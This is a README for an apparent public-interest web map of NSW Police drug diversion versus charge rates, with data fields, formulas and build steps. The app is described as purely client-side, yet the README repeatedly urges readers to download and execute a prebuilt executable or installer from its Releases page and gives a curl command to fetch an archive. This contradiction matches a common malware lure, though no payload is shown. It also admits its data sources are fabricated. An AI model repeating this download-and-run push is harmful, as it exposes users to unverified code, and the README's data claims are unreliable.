[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/MistycFB/nsw-police-drug-diversions-map/releases)

# NSW Police Drug Diversions Map — PAC & PD Visualizer 🗺️🚓

A public-interest web app that maps NSW Police diversion outcomes. The app shows, by Police Area Command (PAC) and Police District (PD), the share of people diverted versus charged from the program start to today. Use the map to spot patterns, compare districts, and export data for research or reporting.

![Map preview](https://raw.githubusercontent.com/MistycFB/nsw-police-drug-diversions-map/main/docs/screenshot.png)

Badges
- ![Australia](https://img.shields.io/badge/Region-Australia-green)
- ![Topics](https://img.shields.io/badge/topics-government--data%20%7C%20journalism-blue)
- ![License](https://img.shields.io/badge/License-MIT-lightgrey)

Topics: australia, government-data, greenparty, independant, journalism, nsw, nsw-greens, police-data, public-interest, research, research-project, transparency

---

## What this repo contains

- A client-side interactive map built with standard web tech (React, Leaflet, D3).
- GeoJSON for PAC and PD boundaries.
- Time-series CSVs of diversion events and charged cases.
- Scripts to generate the map layers and summary tables.
- Build and release artifacts linked from the Releases page: https://github.com/MistycFB/nsw-police-drug-diversions-map/releases

If you visit the Releases page you will find packaged builds and installers. Download the package for your platform and run the executable or serve the extracted files on a static host. The release asset needs to be downloaded and executed to run the prebuilt version.

---

## Key features

- Interactive choropleth map of NSW by PAC and PD.
- Percent diverted vs charged per area and over time.
- Filters: year range, age group, offence class, gender.
- Time-series charts for any selected PAC or PD.
- Export: CSV or GeoJSON for selected map view.
- Simple accessibility options: high-contrast layer, keyboard navigation.
- Print-friendly layouts for reports and briefings.

---

## Data model and formulas

Data sources (fabricated examples used for this repo; adjust to your sources):

- NSW Police diversion records (event-level, anonymised).
- ABS population estimates for rate calculations.
- NSW PAC and PD boundary GeoJSON.

Primary fields in events CSV:
- event_id — unique id
- date — ISO date of the event
- pac_code — PAC identifier
- pd_code — PD identifier
- outcome — "diverted" or "charged"
- age_group — e.g., "18-24"
- gender — "Male" / "Female" / "Other"
- offence_category — e.g., "possession", "supply"

Key computed metrics:
- total_events = count(all events in selection)
- diverted_count = count(events where outcome == "diverted")
- charge_count = count(events where outcome == "charged")
- pct_diverted = (diverted_count / total_events) * 100
- diverted_rate_per_10k = (diverted_count / population) * 10000

Use the exported CSVs for reproducible checks.

---

## How it works

1. Ingest event-level CSVs and merge with PAC/PD lookup.
2. Group events into time bins (year or month).
3. Compute per-area metrics (counts and percentages).
4. Join metrics to GeoJSON by PAC/PD code.
5. Feed joined GeoJSON to the map renderer (Leaflet).
6. Render chart series via D3. Bind map and charts to the same selection.

The UI uses client-side caching. The app loads small precomputed summaries first, then fetches detail sets when you zoom or change filters.

---

## Run locally (developer mode)

Clone the repo and run the app from source.

1. Clone
```bash
git clone https://github.com/MistycFB/nsw-police-drug-diversions-map.git
cd nsw-police-drug-diversions-map
```

2. Install
```bash
# with npm
npm install

# or with yarn
yarn
```

3. Start the dev server
```bash
npm start
# or
yarn start
```

4. Open http://localhost:3000 in your browser.

Environment settings
- REACT_APP_DATA_URL — point to the data folder or an S3 bucket.
- REACT_APP_MAPBOX_TOKEN — optional for basemap tiles (the app falls back to OSM).

Build for production
```bash
npm run build
# or
yarn build
# Serve the build folder on any static host
```

Prebuilt releases

Visit the Releases page here: https://github.com/MistycFB/nsw-police-drug-diversions-map/releases

The releases page contains packaged builds. Download the archive or installer named like nsw-police-diversions-vX.Y.Z.zip (or .tar.gz). Extract the package, then run the included index.html in a browser or run the bundled executable for your OS. The release asset must be downloaded and executed to run the prebuilt app.

Example commands to fetch a release archive (replace the filename with the real asset you pick):
```bash
curl -L -o nsw-divs-v1.0.0.zip \
  "https://github.com/MistycFB/nsw-police-drug-diversions-map/releases/download/v1.0.0/nsw-divs-v1.0.0.zip"
unzip nsw-divs-v1.0.0.zip -d nsw-divs
# open nsw-divs/index.html in your browser
```

---

## Usage guide (map controls)

- Mode toggle: PAC / PD view.
- Time slider: pick a range. The map updates in real time.
- Legend: click a bucket to filter only areas in that range.
- Hover on an area: quick stats popup (pct diverted, counts, rate).
- Click an area: open a detail panel with trend chart and export button.
- Export: choose CSV or GeoJSON for the current selection.

Interpretation tips
- Percent diverted = (diverted_count / total_events) * 100.
- Areas with few events may show large swings. Check counts before making claims.
- Use rate per 10k population to compare areas of different sizes.

---

## Data pipeline scripts

Scripts live in /scripts. Typical steps:

- scripts/clean-events.py — normalize, validate, anonymise event records.
- scripts/aggregate.js — compute per-area time-series and summaries.
- scripts/geo-join.sh — join metrics to GeoJSON by PAC/PD code.
- scripts/generate-static.sh — produce a static data bundle for the web client.

Run aggregation locally:
```bash
node scripts/aggregate.js --input data/events.csv --boundaries data/pacs.geojson --output build/data
```

---

## Testing and QA

- Unit tests for aggregations: run npm test.
- Manual QA: verify a random sample of events against raw records.
- Automated checks: GeoJSON validity and topological checks via geojsonlint.

---

## Contributing

- Fork the repo.
- Create a branch feature/your-topic.
- Add tests for new behavior.
- Open a pull request describing the change and motivation.
- Keep commits small and focused.

Code style
- Follow ESLint rules in the repo.
- Use semantic commit messages.
- Document new endpoints or data formats in docs/.

Issue templates and PR templates live in .github/.

---

## Governance and ethics

The project treats personal data seriously. The packaged datasets in this repo use aggregated or anonymised records only. If you plan to add or publish event-level data, follow local privacy law and publish only data that cannot identify individuals.

---

## Acknowledgements and sources

- NSW government open data portals (for sample schemas).
- ABS for population estimates.
- OpenStreetMap for basemap tiles.
- Community contributors for PAC/PD boundary files.

Images used in this README:
- Screenshot: docs/screenshot.png (repo)
- Australia flag: https://upload.wikimedia.org/wikipedia/commons/b/b9/Flag_of_Australia.svg

---

## License

MIT — see LICENSE file.

---

Get the release package from: https://github.com/MistycFB/nsw-police-drug-diversions-map/releases

Contact
- Repo issues for bugs and feature requests.
- For research access or data questions, open an issue with subject "data request".